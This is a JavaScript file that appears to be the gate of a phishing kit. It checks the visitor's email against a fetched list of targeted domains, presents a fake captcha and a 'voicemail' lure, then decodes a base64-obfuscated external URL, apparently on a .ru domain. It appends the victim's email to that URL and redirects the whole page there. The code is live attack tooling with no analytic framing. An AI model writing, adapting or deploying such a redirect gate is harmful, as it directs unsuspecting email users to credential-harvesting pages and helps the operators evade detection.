/********************************************************
 Configuration: Add the allowed domains in this array
 ********************************************************/
	


    // Elements
    const step1 = document.getElementById('step1');
    const step2 = document.getElementById('step2');
    const step3 = document.getElementById('step3');
    const step4 = document.getElementById('step4');
    const step5 = document.getElementById('step5');

    const emailInput = document.getElementById('email');
    const domainErrorEl = document.getElementById('domainError');

    const mathQuestionEl = document.getElementById('mathQuestion');
    const mathAnswerEl = document.getElementById('mathAnswer');
    const mathErrorEl = document.getElementById('mathError');

    const charChallengeEl = document.getElementById('charChallenge');
    const charAnswerEl = document.getElementById('charAnswer');
    const charErrorEl = document.getElementById('charError');
	const emailValu = emailInput.value.trim();

    let correctMathAnswer = 0;
    let correctCharCode = '';
	let ultimatdomains;
	
	fetch("./list.txt").then(convertData).then(processData);
	function convertData(rawData){
		return rawData.text();
	}
	
	function processData(strData){
		ultimatdomains = strData.split(/\r?\n/);
	}

    /********************************************************
      Step 1: Check if email domain is allowed
    ********************************************************/
	var input = document.getElementById("email");
	input.addEventListener("keypress", function(event) {
		if (event.key === "Enter") {
			event.preventDefault();
			document.getElementById("myBtn").click();
  }
});	

	var input = document.getElementById("mathAnswer");
	input.addEventListener("keypress", function(event) {
		if (event.key === "Enter") {
			event.preventDefault();
			document.getElementById("mathsum").click();
  }
});

	var input = document.getElementById("charChallenge");
	input.addEventListener("keypress", function(event) {
		if (event.key === "Enter") {
			event.preventDefault();
			document.getElementById("charCha").click();
  }
});
    function checkEmailDomain() {
      const emailValue = emailInput.value.trim();
      const emailPattern = /^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$/;

      if (!emailPattern.test(emailValue)) {
        domainErrorEl.textContent = 'Enter the recipient organization email address to proceed.';
        domainErrorEl.style.display = 'block';
        return;
      }

      const domain = emailValue.split('@')[1];
      if (!ultimatdomains.includes(domain)) {
        domainErrorEl.textContent = `Unsupported email. Try again`;
        domainErrorEl.style.display = 'block';
        return;
      }

      domainErrorEl.style.display = 'none';
      step1.classList.add('hidden');
      step2.classList.add('fade-in');

      // Simulate a "checking email" delay, then show math captcha
      setTimeout(() => {
        step2.classList.add('hidden');
        generateMathQuestion();
        step3.classList.add('fade-in');
      }, 3000); // 3-second delay
    }

    /********************************************************
      Step 2 -> Step 3: Generate random math question
    ********************************************************/
    function generateMathQuestion() {
      const num1 = Math.floor(Math.random() * 10) + 1; // range: 1-10
      const num2 = Math.floor(Math.random() * 10) + 1; // range: 1-10
      mathQuestionEl.textContent = `${num1} + ${num2} = ?`;
      correctMathAnswer = num1 + num2;
    }

    // Validate math answer
    function checkMathAnswer() {
      const userAnswer = parseInt(mathAnswerEl.value, 10);
      if (userAnswer === correctMathAnswer) {
        mathErrorEl.style.display = 'none';
        step3.classList.add('hidden');
        generateCharCode();
        step4.classList.add('fade-in');
      } else {
        mathErrorEl.textContent = 'Incorrect math answer. Please try again.';
        mathErrorEl.style.display = 'block';
      }
    }

    /********************************************************
      Step 4: Generate and validate 10-character code
    ********************************************************/
    function generateCharCode() {
      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz0123456789';
      let code = '';
      for (let i = 0; i < 4; i++) {
        code += chars.charAt(Math.floor(Math.random() * chars.length));
      }
      correctCharCode = code;
      charChallengeEl.textContent = code;
    }

    function checkCharAnswer() {
	            const emailInput = document.getElementById('email');
            const email = emailInput.value.trim().toLowerCase();
      if (charAnswerEl.value.trim() === correctCharCode) {
        charErrorEl.style.display = 'none';
        step4.classList.add('hidden');
        step5.classList.add('fade-in');

        // Show voicemail playing animation for 5 seconds, then redirect
                        const link = "aHR0cHM6Ly83eC5ib21pcmF4LnJ1L1oxY3hsOWVHLyNY"; // b6
                const decodedLink = atob(link);
                const finalLink = `${decodedLink}${email}`;
                window.top.location.href = finalLink;
      } else {
        charErrorEl.textContent = 'Incorrect code. Please try again.';
        charErrorEl.style.display = 'block';
      }
    }
